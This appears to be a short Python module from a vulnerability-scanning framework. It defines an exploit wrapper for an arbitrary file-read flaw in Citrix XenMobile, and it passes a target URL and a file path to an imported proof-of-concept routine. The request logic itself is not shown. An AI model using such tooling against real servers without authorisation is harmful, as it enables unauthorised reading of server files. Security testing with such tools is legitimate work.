# -*- coding:utf-8 -*-
# Citrix XenMobile 任意文件读取
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .XenMobile_file_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.read_file(self.vuln.url, cmd)